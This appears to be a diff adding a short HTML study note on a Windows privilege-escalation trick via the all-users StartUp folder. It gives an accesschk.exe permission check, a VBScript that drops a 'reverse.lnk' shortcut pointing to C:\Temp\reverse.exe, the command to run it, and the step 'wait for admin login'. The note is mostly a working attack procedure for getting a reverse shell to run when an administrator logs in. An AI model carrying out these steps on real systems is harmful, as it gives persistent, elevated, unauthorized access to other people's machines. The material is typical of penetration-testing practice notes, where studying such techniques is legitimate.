@@ -1,0 +1,33 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>startup apps</title>
+</head><body>Requirements:<br/>
+1. Possible to restart<br/>
+2. Write file to this directory<br/>
+<br/>
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp<br/>
+<br/>
+<br/>
+check the access<br/>
+<br/>
+.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"<br/>
+<br/>
+<br/>
+<br/>
+<b>CreateShortcut.vbs</b><br/>
+<br/>
+Set oWS = WScript.CreateObject("WScript.Shell")<br/>
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"<br/>
+Set oLink = oWS.CreateShortcut(sLinkFile)<br/>
+oLink.TargetPath = "C:\Temp\reverse.exe"<br/>
+oLink.Save<br/>
+<br/>
+<br/>
+<br/>
+run the script<br/>
+<b>cscript CreateShortcut.vbs<br/>
+<br/>
+<br/>
+wait for admin login</b></body></html>
